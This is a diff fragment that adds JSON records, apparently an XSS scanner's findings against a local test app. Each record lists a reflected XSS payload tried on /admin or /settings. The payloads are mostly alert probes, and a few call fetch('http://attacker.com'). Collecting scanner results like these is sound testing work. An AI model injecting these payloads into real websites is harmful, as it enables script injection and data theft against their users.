+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>confirm(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>prompt(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "javascript:alert(1)",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "';alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "\";alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>console.log(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/admin?user=admin&role=root&token=12345",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "CRITICAL"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<body onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "'><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>confirm(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>prompt(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "javascript:alert(1)",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "';alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "\";alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>console.log(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/settings?theme=dark",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "LOW"
     }
 ]
